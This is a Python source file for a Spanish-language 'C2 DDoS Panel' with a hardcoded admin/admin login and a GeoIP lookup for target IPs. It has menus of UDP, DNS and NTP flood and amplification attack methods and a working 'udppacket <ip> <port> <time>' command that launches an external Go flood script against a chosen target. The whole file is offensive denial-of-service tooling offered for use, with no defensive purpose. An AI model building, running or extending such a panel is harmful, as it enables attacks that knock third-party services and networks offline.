import os
import getpass
import subprocess  # Añadido para ejecutar udppacket.go

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main_banner():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mXxX \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: zJonch \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1\n')
    print("""
                        \x1b[38;2;0;212;14m     ╔╦╗  ╔╦╗  ╔═╗  ╔═╗
                        \x1b[38;2;0;212;14m      ║║   ║║  ║ ║  ╚═╗
                        \x1b[38;2;0;212;14m     ═╩╝  ═╩╝  ╚═╝  ╚═╝
                \x1b[38;2;0;212;14m╔══════════════════════════════════════════════╗
                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to C2 DDoS Panel        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239m DDoS Panel 2025\x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m╚══════════════════════════════════════════════╝
                    \x1b[38;2;0;212;14m╔══════════════════════════════════════╗
                    \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mhttps://github.com/.. \x1b[38;2;0;49;147m║
                    \x1b[38;2;0;212;14m╚══════════════════════════════════════╝
                \x1b[38;2;0;212;14m╔══════════════════════════════════════════════╗
                \x1b[38;2;0;212;14m║      \x1b[38;2;239;239;239mEnvia help para ver los comandos      \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m╚══════════════════════════════════════════════╝
""")

def banner_help():
    print(f'''
\x1b[38;2;0;255;255m╔═══════════════════╗
\x1b[38;2;0;255;255m║   Comandos C2     ║
\x1b[38;2;0;255;255m╚═══════════════════╝
\x1b[38;2;0;255;255mhelp     \x1b[38;2;233;233;233m- Munu de ayuda
\x1b[38;2;0;255;255mgeoip    \x1b[38;2;233;233;233m- Geolocaliza una IP
\x1b[38;2;0;255;255mlayer4   \x1b[38;2;233;233;233m- Métodos Layer4
\x1b[38;2;0;255;255mamp      \x1b[38;2;233;233;233m- Métodos AMP
\x1b[38;2;0;255;255mexit     \x1b[38;2;233;233;233m- Salir
''')

def banner_geoip():
    print(f'''
\x1b[38;2;0;212;14m╔════════════════════╗
\x1b[38;2;0;255;255m║       GEOIP        ║
\x1b[38;2;0;212;14m╚════════════════════╝
''')

def banner_layer4():
    print(f'''
\x1b[38;2;0;255;0m╔═══════════════╗
\x1b[38;2;0;255;0m║   Layer 4     ║
\x1b[38;2;0;255;0m╠═══════════════╣
\x1b[38;2;0;255;255m  UDPFlood
  DNSFLOOD
  NTPFLOOD
  UDPPPS
  UDPPacket <ip> <port> <time>
\x1b[38;2;0;255;0m╚═══════════════╝
''')

def banner_amp():
    print(f'''
\x1b[38;2;0;255;0m╔═══════════════╗
\x1b[38;2;0;255;0m║     AMP's     ║
\x1b[38;2;0;255;0m╠═══════════════╣
\x1b[38;2;0;255;255m  DNS-AMP
  NTP-AMP
  MIX-AMP
\x1b[38;2;0;255;0m╚═══════════════╝
''')

def geoip_lookup():
    banner_geoip()
    ip = input('\033[38;2;0;255;255mIngresa la IP: \033[0m')
    print(f"\033[38;2;0;255;0m[GeoIP]\033[0m Buscando la IP {ip} ...")
    try:
        import requests
        resp = requests.get(f"https://ip-api.com/json/{ip}?fields=66846719")
        data = resp.json()
        if data['status'] == 'success':
            print('\033[38;2;0;255;0mGeoIP:\033[0m')
            print(f"  País: {data.get('country', 'N/A')}")
            print(f"  Región: {data.get('regionName', 'N/A')}")
            print(f"  Ciudad: {data.get('city', 'N/A')}")
            print(f"  ISP: {data.get('isp', 'N/A')}")
            print(f"  Org: {data.get('org', 'N/A')}")
            print(f"  ASN: {data.get('as', 'N/A')}")
            print(f"  IP: {data.get('query', 'N/A')}")
        else:
            print('\033[38;2;255;0;0mNo se pudo obtener la información de esa IP :/\033[0m')
    except Exception as e:
        print('\033[38;2;255;0;0mError al consultar GeoIP :/\033[0m')

def run_udppacket(ip, port, time):
    print(f'\033[38;2;0;255;255m[UDPPacket]\033[0m Ejecutando ataque a {ip}:{port} por {time} segundos...')
    try:
        # Ejecuta el script udppacket.go usando 'go run'.
        # Cambia la ruta si el archivo está en otra ubicación.
        result = subprocess.run(
            ['go', 'run', 'udppacket.go', ip, port, time],
            capture_output=True,
            text=True
        )
        print(result.stdout)
        if result.stderr:
            print('\033[38;2;255;0;0mError:\033[0m', result.stderr)
    except Exception as e:
        print('\033[38;2;255;0;0mError al ejecutar UDPPacket:\033[0m', str(e))

def main_panel():
    clear()
    main_banner()
    while True:
        print('\x1b[38;2;0;212;14m╔══[C2@User]')
        cmd = input('\x1b[38;2;0;212;14m╚════➤ \033[0m').strip().lower()
        if cmd == "help":
            banner_help()
        elif cmd == "geoip":
            geoip_lookup()
        elif cmd == "layer4":
            banner_layer4()
        elif cmd == "amp":
            banner_amp()
        elif cmd == "exit":
            print('\033[38;2;255;0;0mSaliendo...\033[0m')
            break
        elif cmd.startswith("udppacket "):
            # Espera el comando: udppacket <ip> <port> <time>
            args = cmd.split()
            if len(args) == 4:
                ip, port, time = args[1], args[2], args[3]
                run_udppacket(ip, port, time)
            else:
                print('\033[38;2;255;0;0mUso correcto: udppacket <ip> <port> <time>\033[0m')
        elif cmd == "":
            continue
        else:
            print('\033[38;2;255;0;0mComando no reconocido\033[0m')

def login():
    clear()
    print('\033[38;2;0;255;0mLOGIN PANEL\033[0m')
    user = input('\033[38;2;0;255;0mUsuario: \033[0m')
    pwd = getpass.getpass('\033[38;2;0;255;0mContraseña: \033[0m')
    if user == "admin" and pwd == "admin":
        print('\033[38;2;0;255;0m\nAcceso concedido!\033[0m')
        return True
    else:
        print('\033[38;2;255;0;0m\nUsuario o contraseña incorrecta\033[0m')
        return False

if __name__ == "__main__":
    while not login():
        pass
    main_panel()
